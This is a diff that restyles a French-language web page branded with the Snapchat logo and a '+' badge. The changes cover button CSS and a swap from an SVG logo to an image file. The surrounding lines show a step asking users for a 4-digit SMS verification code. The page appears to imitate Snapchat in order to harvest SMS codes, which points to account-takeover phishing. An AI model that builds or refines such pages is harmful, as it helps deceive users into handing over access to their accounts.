@@ -126,7 +126,23 @@
             border-radius: 40px; display: flex; justify-content: center; align-items: center;
             box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
         }
-        .snap-bg { width: 88%; height: 88%; background-color: #fffc00; border-radius: 32px; display: flex; justify-content: center; align-items: center; }
+        .snap-bg { 
+            width: 88%; 
+            height: 88%; 
+            background-color: #fffc00; 
+            border-radius: 32px; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .snap-bg img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
         .plus-badge {
             position: absolute; top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
             width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold;
@@ -207,6 +223,33 @@
         }
 
         .btn-glow:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .btn-return {
+            width: 100%;
+            background: linear-gradient(135deg, #cc33ff, #ff0080);
+            border: none;
+            border-radius: 12px;
+            padding: 20px;
+            color: white;
+            font-weight: 800;
+            text-transform: uppercase;
+            font-size: 18px;
+            letter-spacing: 2px;
+            cursor: pointer;
+            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
+            margin-bottom: 30px;
+            transition: all 0.3s ease;
+        }
+
+        .btn-return:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(255, 0, 255, 0.8);
+        }
+
+        .btn-return:disabled {
             opacity: 0.7;
             cursor: not-allowed;
         }
@@ -292,6 +335,7 @@
             .container { padding: 40px 15px; }
             .title { font-size: 20px; }
             .btn-glow { padding: 16px; font-size: 16px; }
+            .btn-return { padding: 16px; font-size: 16px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
         }
 
@@ -328,12 +372,7 @@
             <div class="logo-wrapper">
                 <div class="border-gradient">
                     <div class="snap-bg">
-                        <svg width="75%" viewBox="0 0 200 200" role="img" aria-label="Logo Snapchat">
-                            <circle cx="100" cy="100" r="90" fill="#fffc00"/>
-                            <circle cx="70" cy="80" r="15" fill="#000"/>
-                            <circle cx="130" cy="80" r="15" fill="#000"/>
-                            <path d="M 100 130 Q 90 140 100 145 Q 110 140 100 130" fill="#000"/>
-                        </svg>
+                        <img src="logosnapchat.png" alt="Logo Snapchat">
                     </div>
                 </div>
                 <div class="plus-badge">+</div>
@@ -362,7 +401,7 @@
                     <input type="tel" id="sms-code" placeholder="Code à 4 chiffres" maxlength="4" aria-label="Code de vérification SMS" inputmode="numeric" style="text-align: center;">
                 </div>
                 <button class="btn-glow" id="verifyBtn" onclick="showWaitingMenu()">Vérifier</button>
-                <button class="btn-glow" style="background: linear-gradient(135deg, #666, #333); margin-bottom: 10px;" onclick="goBackToStep1()">Retour</button>
+                <button class="btn-return" onclick="goBackToStep1()">Retour</button>
             </div>
 
             <div id="step-3" style="display: none;">
